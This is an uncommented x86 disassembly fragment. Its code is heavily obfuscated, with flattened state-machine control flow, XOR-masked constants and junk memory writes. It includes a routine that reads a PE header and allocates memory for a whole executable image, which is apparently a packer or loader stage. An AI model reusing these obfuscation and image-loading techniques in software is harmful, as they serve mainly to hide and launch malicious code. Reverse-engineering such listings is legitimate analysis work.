  4231f8:	je     0x423206
  4231fa:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  423204:	jmp    0x423210
  423206:	and    DWORD PTR ds:0x3343fade,0x5265ec3f
  423210:	pop    edi
  423211:	pop    esi
  423212:	pop    ebx
  423213:	leave  
  423214:	ret    0x18
  423217:	push   ebp
  423218:	mov    ebp,esp
  42321a:	and    esp,0xfffffff8
  42321d:	mov    eax,DWORD PTR [ebp+0x20]
  423220:	sub    esp,0x14
  423223:	push   ebx
  423224:	mov    ebx,DWORD PTR [ebp+0x14]
  423227:	push   esi
  423228:	push   edi
  423229:	cmp    eax,0xf89c85b5
  42322e:	jne    0x42323a
  423230:	push   0xf89c85b4
  423235:	jmp    0x42336c
  42323a:	mov    eax,DWORD PTR [ebp+0x20]
  42323d:	cmp    eax,0xf89c85b4
  423242:	jne    0x42324e
  423244:	push   0xf89c85bb
  423249:	jmp    0x42336c
  42324e:	mov    eax,DWORD PTR [ebp+0x20]
  423251:	cmp    eax,0xf89c85bb
  423256:	jne    0x423262
  423258:	push   0xf89c85ba
  42325d:	jmp    0x42336c
  423262:	mov    eax,DWORD PTR [ebp+0x20]
  423265:	cmp    eax,0xf89c85ba
  42326a:	jne    0x423276
  42326c:	push   0xf89c85b9
  423271:	jmp    0x42336c
  423276:	mov    ecx,DWORD PTR [ebp+0x20]
  423279:	mov    eax,0xf89c85be
  42327e:	cmp    ecx,eax
  423280:	jne    0x42333c
  423286:	mov    eax,DWORD PTR [ebp+0x10]
  423289:	mov    DWORD PTR [esp+0xc],eax
  42328d:	mov    eax,DWORD PTR [ebp+0x18]
  423290:	mov    DWORD PTR [esp+0x14],eax
  423294:	mov    eax,DWORD PTR [ebp+0xc]
  423297:	mov    DWORD PTR [esp+0x18],eax
  42329b:	mov    eax,DWORD PTR [ebp+0x8]
  42329e:	mov    DWORD PTR [esp+0x10],eax
  4232a2:	mov    eax,DWORD PTR [esp+0x10]
  4232a6:	mov    ecx,DWORD PTR [esp+0x14]
  4232aa:	mov    edi,0x75108b3
  4232af:	xor    eax,edi
  4232b1:	mov    esi,0x3272fa
  4232b6:	add    eax,esi
  4232b8:	mov    DWORD PTR [ecx],eax
  4232ba:	mov    eax,DWORD PTR [esp+0xc]
  4232be:	mov    eax,DWORD PTR [eax+0x194]
  4232c4:	mov    ecx,DWORD PTR [eax]
  4232c6:	mov    eax,DWORD PTR [esp+0xc]
  4232ca:	mov    eax,DWORD PTR [eax+0x194]
  4232d0:	mov    eax,DWORD PTR [eax]
  4232d2:	add    eax,DWORD PTR [ecx+0x3c]
  4232d5:	mov    ecx,DWORD PTR [esp+0xc]
  4232d9:	mov    ecx,DWORD PTR [ecx+0x1e0]
  4232df:	mov    ecx,DWORD PTR [ecx+0x14]
  4232e2:	push   0x4
  4232e4:	push   0x3000
  4232e9:	push   DWORD PTR [eax+0x50]
  4232ec:	push   0x0
  4232ee:	call   ecx
  4232f0:	mov    DWORD PTR [ebx],eax
  4232f2:	mov    eax,DWORD PTR [esp+0x10]
  4232f6:	push   DWORD PTR [esp+0xc]
  4232fa:	xor    eax,edi
  4232fc:	add    eax,esi
  4232fe:	mov    DWORD PTR [esp+0x20],eax
  423302:	lea    eax,[esp+0x20]
  423306:	push   eax
  423307:	push   ebx
  423308:	push   DWORD PTR [esp+0x20]
  42330c:	push   DWORD PTR [esp+0x28]
  423310:	push   DWORD PTR [esp+0x24]
  423314:	call   0x422cd9
  423319:	mov    eax,DWORD PTR [esp+0x10]
  42331d:	mov    ecx,DWORD PTR [ebx]
  42331f:	xor    eax,edi
  423321:	add    eax,esi
  423323:	cmp    ecx,eax
  423325:	je     0x423383
  423327:	mov    eax,DWORD PTR [esp+0x18]
  42332b:	mov    ecx,DWORD PTR [esp+0x14]
  42332f:	xor    eax,edi
  423331:	add    eax,esi
  423333:	imul   eax,DWORD PTR [esp+0x1c]
  423338:	mov    DWORD PTR [ecx],eax
  42333a:	jmp    0x423383
  42333c:	mov    ecx,DWORD PTR [ebp+0x20]
  42333f:	cmp    ecx,0xf89c85b9
  423345:	jne    0x42334e
  423347:	push   0xf89c85b8
  42334c:	jmp    0x42336c
  42334e:	mov    ecx,DWORD PTR [ebp+0x20]
  423351:	cmp    ecx,0xf89c85b8
  423357:	jne    0x423360
  423359:	push   0xf89c85bf
  42335e:	jmp    0x42336c
  423360:	mov    ecx,DWORD PTR [ebp+0x20]
  423363:	cmp    ecx,0xf89c85bf
  423369:	jne    0x423383
  42336b:	push   eax
  42336c:	push   DWORD PTR [ebp+0x1c]
  42336f:	push   DWORD PTR [ebp+0x18]
  423372:	push   ebx
  423373:	push   DWORD PTR [ebp+0x10]
  423376:	push   DWORD PTR [ebp+0xc]
  423379:	push   DWORD PTR [ebp+0x8]
  42337c:	call   0x423217
  423381:	mov    DWORD PTR [ebx],eax
  423383:	mov    eax,DWORD PTR [ebx]
  423385:	pop    edi
  423386:	pop    esi
  423387:	pop    ebx
  423388:	mov    esp,ebp
  42338a:	pop    ebp
  42338b:	ret    0x1c
  42338e:	push   ebp
  42338f:	mov    ebp,esp
  423391:	sub    esp,0xc
  423394:	mov    eax,0xf89c85b5
  423399:	mov    DWORD PTR [ebp-0x8],eax
  42339c:	mov    DWORD PTR [ebp-0xc],0xf89c85b4
  4233a3:	mov    ecx,DWORD PTR [ebp-0x8]
  4233a6:	xor    ecx,0x75108b3
  4233ac:	add    ecx,0x3272fa
  4233b2:	mov    DWORD PTR [ebp-0x4],ecx
  4233b5:	mov    ecx,DWORD PTR [ebp+0xc]
  4233b8:	push   eax
  4233b9:	mov    DWORD PTR [ebp+0xc],ecx
  4233bc:	push   DWORD PTR [ebp+0xc]
  4233bf:	lea    eax,[ebp-0x4]
  4233c2:	push   DWORD PTR [ebp+0x8]
  4233c5:	push   eax
  4233c6:	push   DWORD PTR [ebp+0xc]
  4233c9:	push   DWORD PTR [ebp-0xc]
  4233cc:	push   DWORD PTR [ebp-0x8]
  4233cf:	call   0x423217
  4233d4:	mov    DWORD PTR [ebp-0x4],eax
  4233d7:	mov    eax,DWORD PTR [ebp-0x4]
  4233da:	leave  
  4233db:	ret    0x8
	...
